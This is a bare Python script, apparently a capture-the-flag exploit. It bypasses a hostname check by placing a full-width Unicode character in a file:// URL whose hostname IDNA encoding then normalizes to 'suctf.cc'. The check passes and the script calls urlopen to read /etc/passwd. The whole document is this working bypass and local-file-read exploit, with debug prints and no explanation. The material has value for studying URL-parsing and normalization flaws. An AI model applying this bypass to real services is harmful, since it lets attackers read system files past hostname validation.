from urllib import parse
from urllib.parse import urlsplit,urlunsplit
import urllib
import  urllib.request
url = "file://suctf.cc"+u'\uFF03'+":aaa@localhost/etc/passwd"
host = parse.urlparse(url).hostname

if host == 'suctf.cc':
    print("a your problem? 111")
parts = list(urlsplit(url))
host = parts[1]
print("[1] "+host)
if host == 'suctf.cc':
    print("a your problem? 222 " + host)
newhost = []
for h in host.split('.'):
    newhost.append(h.encode('idna').decode('utf-8'))
parts[1] = '.'.join(newhost)
finalUrl = urlunsplit(parts).split(' ')[0]
print("[2] "+finalUrl)
host = parse.urlparse(finalUrl).hostname
print("[3] "+host)
if host == 'suctf.cc':
    print(urllib.request.urlopen(finalUrl).read())
else:
    print("a your problem? 333")